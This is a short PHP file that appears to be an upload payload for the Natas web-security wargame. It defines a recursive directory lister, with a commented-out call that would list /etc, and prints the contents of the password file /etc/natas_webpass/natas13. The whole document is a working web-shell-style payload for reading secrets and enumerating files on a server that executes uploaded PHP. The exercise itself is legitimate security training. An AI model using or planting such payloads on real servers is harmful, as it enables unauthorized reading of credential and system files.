<?php
function getDirContents($dir, &$results = array()){
    $files = scandir($dir);

    foreach($files as $key => $value){
        $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
        if(is_readable($path)){
          if(!is_dir($path)) {
              $results[] = $path;
          } else if($value != "." && $value != "..") {
              getDirContents($path, $results);
              $results[] = $path;
          }
        }
    }
    return $results;
}


function getDirContentsAndPrintList($dirTarget) {
  $content = getDirContents($dirTarget);
  foreach ($content as $key => $val) {
    echo "<LI>$val";
  }
}

// getDirContentsAndPrintList('/etc');

echo file_get_contents('/etc/natas_webpass/natas13');

?>
